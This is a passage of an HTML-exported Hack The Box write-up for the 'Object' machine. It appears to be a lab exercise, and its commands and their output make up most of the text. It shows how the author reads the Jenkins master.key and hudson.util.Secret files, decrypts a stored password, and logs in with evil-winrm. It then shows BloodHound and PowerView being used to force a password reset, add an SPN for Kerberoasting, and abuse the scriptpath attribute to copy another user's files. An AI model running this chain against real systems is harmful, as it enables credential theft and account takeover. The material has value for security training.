+            &lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
+          &lt;/java.util.concurrent.CopyOnWriteArrayList&gt;
+        &lt;/entry&gt;
+      &lt;/domainCredentialsMap&gt;
+    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
+    &lt;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=&quot;email-ext@2.84&quot;&gt;
+      &lt;triggers/&gt;
+    &lt;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty&gt;
+    &lt;hudson.model.MyViewsProperty&gt;
+      &lt;views&gt;
+        &lt;hudson.model.AllView&gt;
+          &lt;owner class=&quot;hudson.model.MyViewsProperty&quot; reference=&quot;../../..&quot;/&gt;
+          &lt;name&gt;all&lt;/name&gt;
+          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
+          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
+          &lt;properties class=&quot;hudson.model.View$PropertyList&quot;/&gt;
+        &lt;/hudson.model.AllView&gt;
+      &lt;/views&gt;
+    &lt;/hudson.model.MyViewsProperty&gt;
+    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=&quot;display-url-api@2.3.5&quot;&gt;
+      &lt;providerId&gt;default&lt;/providerId&gt;
+    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
+    &lt;hudson.model.PaneStatusProperties&gt;
+      &lt;collapsed/&gt;
+    &lt;/hudson.model.PaneStatusProperties&gt;
+    &lt;jenkins.security.seed.UserSeedProperty&gt;
+      &lt;seed&gt;ea75b5bd80e4763e&lt;/seed&gt;
+    &lt;/jenkins.security.seed.UserSeedProperty&gt;
+    &lt;hudson.search.UserSearchProperty&gt;
+      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
+    &lt;/hudson.search.UserSearchProperty&gt;
+    &lt;hudson.model.TimeZoneProperty/&gt;
+    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
+      &lt;passwordHash&gt;#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW&lt;/passwordHash&gt;
+    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
+    &lt;hudson.tasks.Mailer_-UserProperty plugin=&quot;mailer@1.34&quot;&gt;
+      &lt;emailAddress&gt;admin@object.local&lt;/emailAddress&gt;
+    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
+    &lt;jenkins.security.ApiTokenProperty&gt;
+      &lt;tokenStore&gt;
+        &lt;tokenList/&gt;
+      &lt;/tokenStore&gt;
+    &lt;/jenkins.security.ApiTokenProperty&gt;
+    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
+      &lt;roles&gt;
+        &lt;string&gt;authenticated&lt;/string&gt;
+      &lt;/roles&gt;
+      &lt;timestamp&gt;1634793332195&lt;/timestamp&gt;
+    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
+  &lt;/properties&gt;
+&lt;/user&gt;</code></pre><h3 id="187d1b9f-8847-80f1-8150-fb5aa1bb4ae5" class="">I got the pass, but <a href="https://stackoverflow.com/questions/25547381/what-password-encryption-jenkins-is-using">reading</a> about to decrypt jenkins password we need key</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-808e-b062-ddcf1f0bcae0" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">powershell.exe &quot;dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets&quot;
+
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;powershell.exe &quot;dir C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets&quot; 
+
+
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       10/20/2021  10:08 PM                filepath-filters.d                                                    
+d-----       10/20/2021  10:08 PM                whitelisted-callables.d                                               
+-a----       10/20/2021  10:26 PM            272 hudson.console.AnnotatedLargeText.consoleAnnotator                    
+-a----       10/20/2021  10:26 PM             32 hudson.model.Job.serverCookie                                         
+-a----       10/20/2021  10:15 PM            272 hudson.util.Secret                                                    
+-a----       10/20/2021  10:08 PM             32 jenkins.model.Jenkins.crumbSalt                                       
+-a----       10/20/2021  10:08 PM            256                                                            
+-a----       10/20/2021  10:08 PM            272 org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY     
+-a----       10/20/2021  10:21 PM              5 slave-to-master-security-kill-switch  </code></pre><h3 id="187d1b9f-8847-8053-864b-e02d5c413e2a" class="">Reading master.key</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8052-bb73-e6939c188dc8" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">powershell.exe &quot;type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key &quot;
+
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;powershell.exe &quot;type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key &quot; 
+f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19</code></pre><h3 id="187d1b9f-8847-8013-90d0-e7e7a9d78221" class="">Reading the scripts to decrypt the password we need too <a href="https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py">hudson.util.Secret</a> but when I tried to read it is a binary file, so let’s try to convert it into <a href="https://stackoverflow.com/questions/42592518/encode-decode-exe-into-base64">base64</a></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8087-80fe-fdf2fe70465d" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">powershell.exe &quot;$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(&#x27;C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret&#x27;));Write-Output $base64string&quot;
+
+
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;powershell.exe &quot;$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(&#x27;C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret&#x27;));Write-Output $base64string&quot; 
+gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\dir&gt;exit 0 </code></pre><h3 id="187d1b9f-8847-8059-8ccb-f05feed25152" class="">Get Creds with this <a href="https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py">decrypt</a> code</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8065-83be-e1938814f514" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ cat credentials.xml   
+&lt;username&gt;oliver&lt;/username&gt;
+              &lt;password&gt;{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}&lt;/password&gt;
+                                                                                                                 
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ cat master.key     
+f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ echo &quot;gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=&quot; | base64 -d &gt; hudson.util.Secret
+
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ python3 decrypt.py master.key hudson.util.Secret credentials.xml 
+/home/drroot/Desktop/.htb/Object/decrypt.py:124: SyntaxWarning: invalid escape sequence &#x27;\{&#x27;
+  secrets += re.findall(secret_title + &#x27;&gt;\{?(.*?)\}?&lt;/&#x27; + secret_title, data)
+c1cdfun_d2434
+</code></pre><h3 id="187d1b9f-8847-800a-8852-de5e36ffb8c4" class="">Evil_winrm</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8062-a9ed-dedf30f6bc36" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ evil-winrm -i 10.10.11.132 -u oliver -p &#x27;c1cdfun_d2434&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\oliver\Documents&gt; netstat -an | findstr LISTENING
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49918          0.0.0.0:0              LISTENING
+  TCP    10.10.11.132:53        0.0.0.0:0              LISTENING
+  TCP    10.10.11.132:139       0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING
+  TCP    [::]:80                [::]:0                 LISTENING
+  TCP    [::]:88                [::]:0                 LISTENING
+  TCP    [::]:135               [::]:0                 LISTENING
+  TCP    [::]:389               [::]:0                 LISTENING
+  TCP    [::]:445               [::]:0                 LISTENING
+  TCP    [::]:464               [::]:0                 LISTENING
+  TCP    [::]:593               [::]:0                 LISTENING
+  TCP    [::]:636               [::]:0                 LISTENING
+  TCP    [::]:3268              [::]:0                 LISTENING
+  TCP    [::]:3269              [::]:0                 LISTENING
+  TCP    [::]:5985              [::]:0                 LISTENING
+  TCP    [::]:8080              [::]:0                 LISTENING
+  TCP    [::]:9389              [::]:0                 LISTENING
+  TCP    [::]:47001             [::]:0                 LISTENING
+  TCP    [::]:49664             [::]:0                 LISTENING
+  TCP    [::]:49665             [::]:0                 LISTENING
+  TCP    [::]:49666             [::]:0                 LISTENING
+  TCP    [::]:49667             [::]:0                 LISTENING
+  TCP    [::]:49673             [::]:0                 LISTENING
+  TCP    [::]:49674             [::]:0                 LISTENING
+  TCP    [::]:49684             [::]:0                 LISTENING
+  TCP    [::]:49695             [::]:0                 LISTENING
+  TCP    [::]:49918             [::]:0                 LISTENING
+  TCP    [::1]:53               [::]:0                 LISTENING
+
+</code></pre><h3 id="187d1b9f-8847-801a-a40b-fa53011129ff" class=""><a href="https://github.com/SpecterOps/BloodHound">Bloodhount</a> to identify vulns → <a href="https://github.com/SpecterOps/SharpHound/releases?page=3">Sharphound</a> for get information from user but first we need to know domain name</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-8075-b30e-f92eda379bb0" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\oliver\Desktop&gt; Get-ADUser -Filter *
+
+
+DistinguishedName : CN=Administrator,CN=Users,DC=object,DC=local
+Enabled           : True
+GivenName         :
+Name              : Administrator
+ObjectClass       : user
+ObjectGUID        : db5685f4-aee6-4cbc-be31-08997025df10
+SamAccountName    : Administrator
+SID               : S-1-5-21-4088429403-1159899800-2753317549-500
+Surname           :
+UserPrincipalName :
+
+DistinguishedName : CN=Guest,CN=Users,DC=object,DC=local
+Enabled           : False
+GivenName         :
+Name              : Guest
+ObjectClass       : user
+ObjectGUID        : ec61ff21-35ba-4281-8bf0-c941fb5f757e
+SamAccountName    : Guest
+SID               : S-1-5-21-4088429403-1159899800-2753317549-501
+Surname           :
+UserPrincipalName :
+
+DistinguishedName : CN=krbtgt,CN=Users,DC=object,DC=local
+Enabled           : False
+GivenName         :
+Name              : krbtgt
+ObjectClass       : user
+ObjectGUID        : f95afbaf-b546-4c4f-a8f0-f45ebc7b3cea
+SamAccountName    : krbtgt
+SID               : S-1-5-21-4088429403-1159899800-2753317549-502
+Surname           :
+UserPrincipalName :
+
+DistinguishedName : CN=Olivar Ava,CN=Users,DC=object,DC=local
+Enabled           : True
+GivenName         : Olivar
+Name              : Olivar Ava
+ObjectClass       : user
+ObjectGUID        : 5413283d-6310-418b-9bd1-472ffc1f932d
+SamAccountName    : oliver
+SID               : S-1-5-21-4088429403-1159899800-2753317549-1103
+Surname           : Ava
+UserPrincipalName : oliver@object.local
+
+DistinguishedName : CN=Smith William,CN=Users,DC=object,DC=local
+GivenName         : Smith
+Name              : Smith William
+ObjectClass       : user
+ObjectGUID        : 742c4a19-245f-42f0-829a-e30dcd298739
+SamAccountName    : smith
+SID               : S-1-5-21-4088429403-1159899800-2753317549-1104
+Surname           : William
+UserPrincipalName : smith@object.local
+
+DistinguishedName : CN=maria garcia,CN=Users,DC=object,DC=local
+Enabled           : True
+GivenName         : maria
+Name              : maria garcia
+ObjectClass       : user
+ObjectGUID        : 9340fcdd-2f1e-4f89-bafe-e1dcdd5c2b6f
+SamAccountName    : maria
+SID               : S-1-5-21-4088429403-1159899800-2753317549-1106
+Surname           : garcia
+UserPrincipalName : maria@object.local
+</code></pre><h3 id="187d1b9f-8847-80fc-b8e6-e0a369b61e47" class="">Upload and generate report</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="187d1b9f-8847-80b4-b6e3-ef3077596fe7" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\oliver\Desktop&gt; upload SharpHound.exe 
+*Evil-WinRM* PS C:\Users\oliver\Desktop&gt; .\SharpHound.exe --domain object.local --CollectionMethod all --domaincontroller 127.0.0.1
+
+</code></pre><h3 id="188d1b9f-8847-8081-98f9-f27678289092" class="">Install bloodhound gui and import files and filter</h3><figure id="188d1b9f-8847-80b1-93a7-e88c65d6c9b4" class="image"><a href="../img/Object/image 6.png"><img style="width:709.984375px" src="../img/Object/image 6.png"/></a></figure><h3 id="188d1b9f-8847-8083-8824-c64286c17641" class="">We can force Smith to change password, bloodhound will show you how to do it</h3><figure id="188d1b9f-8847-8049-930d-d157e421860d" class="image"><a href="../img/Object/image 7.png"><img style="width:709.96875px" src="../img/Object/image 7.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-8002-9d02-c41cab941b4a" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">
+*Evil-WinRM* PS C:\Users\oliver\Documents&gt; upload PowerView.ps1
+                                        
+Info: Uploading /home/drroot/Desktop/.htb/Object/PowerView.ps1 to C:\Users\oliver\Documents\PowerView.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\oliver\Documents&gt; . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\oliver\Documents&gt; $SecPassword = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\oliver\Documents&gt; Set-DomainUserPassword -Identity smith -AccountPassword $SecPassword
+</code></pre><h3 id="188d1b9f-8847-8008-9141-d0bae5c1aa9a" class="">Open other evil-winrm</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-80d7-87f0-db9838642b04" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ evil-winrm -i 10.10.11.132 -u smith -p &#x27;Password123!&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\smith\Documents&gt; whoami
+object\smith
+</code></pre><h3 id="188d1b9f-8847-809a-9253-f0886ebcab11" class="">Lateral Movement to Maria, tried to make Kerberoast but it was not possible</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-8043-bec4-dc12e5e8fd80" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">
+*Evil-WinRM* PS C:\Users\smith\Documents&gt; . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\smith\Documents&gt; Set-DomainObject  -Identity maria -SET @{serviceprincipalname=&#x27;nonexistent/drroot&#x27;}
+*Evil-WinRM* PS C:\Users\smith\Documents&gt; Get-DomainSPNTicket maria | fl</code></pre><h3 id="188d1b9f-8847-80df-b001-d3f1ff2a485c" class="">Just I’ll try to read files or execute something? → <a href="https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/">scriptpath</a></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-80f1-92ea-f73591fbf036" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ cat script.ps1 
+dir C:\Users\maria\Desktop &gt; C:\Temp\output.txt
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-80c5-91a0-c576cc74ded4" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Temp&gt; Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Temp&gt; Set-DomainObject -Identity maria -SET @{scriptpath=&#x27;C:\Temp\script.ps1&#x27;}
+*Evil-WinRM* PS C:\Temp&gt; dir
+
+
+    Directory: C:\Temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/26/2025   8:37 PM            830 output.txt
+-a----        1/26/2025   8:37 PM         770279 PowerView.ps1
+-a----        1/26/2025   8:36 PM             48 script.ps1
+
+
+*Evil-WinRM* PS C:\Temp&gt; type output.txt
+
+
+    Directory: C:\Users\maria\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/26/2021   8:13 AM           6144 Engines.xls
+
+</code></pre><h3 id="188d1b9f-8847-800b-ad14-f1b0f8c4544f" class="">Now, change the script.ps1</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="188d1b9f-8847-8019-a425-e753de8004ef" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Object]
+└─$ cat script.ps1
+copy C:\Users\maria\Desktop\Engines.xls  C:\Temp\
+
